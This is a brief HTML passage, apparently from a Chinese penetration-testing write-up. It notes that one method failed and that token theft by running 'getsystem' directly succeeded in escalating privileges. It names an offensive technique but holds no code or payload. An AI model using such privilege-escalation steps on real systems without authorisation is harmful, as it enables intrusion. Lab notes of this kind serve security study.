 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1762952760995-af21140c-3a0a-4ff0-8084-d620d37e5eca.png"></p>
 <p>失败</p>
 <h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><h3 id="直接尝试-getsystem"><a href="#直接尝试-getsystem" class="headerlink" title="直接尝试 getsystem"></a>直接尝试 getsystem</h3><p>成功</p>
